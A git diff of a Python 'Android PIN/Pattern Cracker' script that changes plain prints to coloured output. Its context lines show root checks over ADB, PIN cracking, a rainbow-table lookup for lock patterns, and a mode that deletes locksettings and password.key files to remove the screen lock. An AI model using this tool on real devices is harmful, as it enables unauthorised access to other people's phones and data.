@@ -1,10 +1,14 @@
 from dotenv import load_dotenv
+from termcolor import colored, cprint
 import os, sys, sqlite3, time, json
 
-print("=================================")
-print("   Android PIN/Pattern Cracker   ")
-print("         made by @D3vle0         ")
-print("=================================\n")
+print_green = lambda x: cprint(x, 'green')
+print_red = lambda x: cprint(x, 'red')
+
+print_green("=================================")
+print_green("   Android PIN/Pattern Cracker   ")
+print_green("         made by @D3vle0         ")
+print_green("=================================\n")
 
 load_dotenv(verbose=True)
 ADB_PATH = os.getenv('ADB_PATH')
@@ -22,10 +26,10 @@ def check_root():
     try: 
         uid = int(os.popen(f"{ADB_PATH} shell id").read().split("uid=")[1].split(" ")[0].split("(")[0])
     except:
-        print("[-] Error: No device found")
+        print_red("[-] Error: No device found")
         sys.exit(3)
     if uid:
-        print("[-] No root access")
+        print_red("[-] No root access")
         sys.exit(3)
 
 
@@ -45,10 +49,10 @@ try:
         try:
             pin_length = int(sys.argv[2])
             if pin_length < 4 or pin_length > 10:
-                print("[-] Invalid PIN length")
+                print_red("[-] Invalid PIN length")
                 sys.exit(3)
         except IndexError:
-            print("[-] Error: PIN length required.")
+            print_red("[-] Error: PIN length required.")
             sys.exit(3)
         check_root()
         print("[+] connected to device")
@@ -82,9 +86,9 @@ try:
         try:
             pin = os.popen("cat out.txt").read().split("\n")[0].split(":")[2]
         except:
-            print("[-] Error: Crack failed.")
+            print_red("[-] Error: Crack failed.")
             sys.exit(3)
-        print(f'[+] cracked PIN: {pin}')
+        print_green(f'[+] cracked PIN: {pin}')
         delete()
     elif sys.argv[1] == "--pattern":
         check_root()
@@ -99,7 +103,7 @@ try:
         cur = conn.cursor()
         cur.execute(f"SELECT pattern FROM RainbowTable WHERE hash = '{sha1_hash}'")
         pattern = cur.fetchall()[0][0]
-        print(f"[+] cracked pattern: {pattern}")
+        print_green(f"[+] cracked pattern: {pattern}")
         queue=json.loads(pattern)
         path=[0]*9
         for i in range(len(queue)):
@@ -111,7 +115,7 @@ try:
             else:
                 pattern_path += f"[{str(path[i])}]\n\n"
         pattern_path = pattern_path[:-1]
-        print(pattern_path)
+        print_green(pattern_path)
         delete()
     elif sys.argv[1] == "--del":
         check_root()
@@ -122,7 +126,7 @@ try:
         os.system(f"{ADB_PATH} shell 'su -c rm /data/system/locksettings.db-shm'")
         os.system(f"{ADB_PATH} shell 'su -c rm /data/system/locksettings.db-wal'")
         os.system(f"{ADB_PATH} shell 'su -c rm /data/system/password.key'")
-        print("[+] done")
+        print_green("[+] done")
     else:
         show_help()
         sys.exit(3)
